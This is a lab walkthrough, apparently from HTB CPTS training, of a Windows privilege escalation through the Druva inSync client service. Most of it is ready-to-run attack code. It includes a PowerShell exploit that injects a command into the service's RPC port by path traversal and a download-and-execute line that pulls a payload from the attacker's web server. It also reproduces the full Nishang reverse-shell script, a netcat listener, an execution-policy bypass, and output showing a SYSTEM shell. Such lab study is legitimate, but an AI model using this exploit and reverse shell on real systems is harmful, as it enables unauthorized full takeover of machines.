We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let's look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.

enumerate the services

```

c:\Tools>netstat -ano | findstr 6064
  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3408
  TCP    127.0.0.1:6064         127.0.0.1:61860        ESTABLISHED     3408
  TCP    127.0.0.1:61860        127.0.0.1:6064         ESTABLISHED     3980

```

create the Druva.ps1

```
$ErrorActionPreference = "Stop"

# Your custom payload targeting your Python web server
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.187:8080/shell.ps1')"

# Establish connection to the local Druva service port
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)

# Format the RPC headers and inject the payload via directory traversal path
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

# Send data packets to trigger execution
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

using your vm ip and port.

create a shell.ps1 file in the attack machine

```
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.187 -Port 9443

```

this code should be added to the last of the script.

make sure its your vm ip and port number of the listener.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.187 -Port 9443
```

start a python server 

```
┌──(satoru㉿satoru)-[~/Desktop/HTB/CPTS/WinPE]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

```

then start a nc listener.

```
└─$ nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.15.187] from (UNKNOWN) [10.129.51.172] 65114


```

now run the Druva.ps1.

```
PS C:\Users\htb-student\desktop> .\Druva.ps1
22
4
4
318
```

successfully got the reverseshell.

```
└─$ nc -lvnp 9443
listening on [any] 9443 ...
connect to [10.10.15.187] from (UNKNOWN) [10.129.51.172] 65114
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>whoami
nt authority\system

```

Attack Flow.

```
### Phase 1: Attack Workstation Setup

1. **Host the Payload:** Start a Python HTTP web server on port `8080` in the directory where your `shell.ps1` script is saved.
    
2. **Start the Listener:** Open a separate terminal window and run Netcat to listen on port `9443` for the incoming reverse shell connection.
    

### Phase 2: Victim Windows Execution

3. **Bypass Script Restrictions:** Open PowerShell on the target machine and run `Set-ExecutionPolicy Bypass -Scope Process` so you can execute the exploit script.
    
4. **Trigger the Exploit:** Run `.\druva.ps1` from the PowerShell console.
    

### Phase 3: The Exploit Connection Chain

5. **Local RPC Communication:** The exploit script connects locally to port `6064` on the Windows machine, targeting the vulnerable Druva inSync Client Service.
    
6. **Command Injection Trigger:** The script sends a crafted message using directory traversal sequences to trick the service into launching `cmd.exe`.
    
7. **Privileged Downloader:** Because the service runs as the high-privilege `NT AUTHORITY\SYSTEM` account, it executes the payload string under that authority, causing the system to reach out to your Python web server on port `8080` to download and run `shell.ps1` directly into memory.
    
8. **Reverse Shell Callback:** The executed script establishes an outbound network connection from the victim machine back to your Netcat listener on port `9443`, granting you an interactive shell operating with full `SYSTEM` administrative privileges.
```


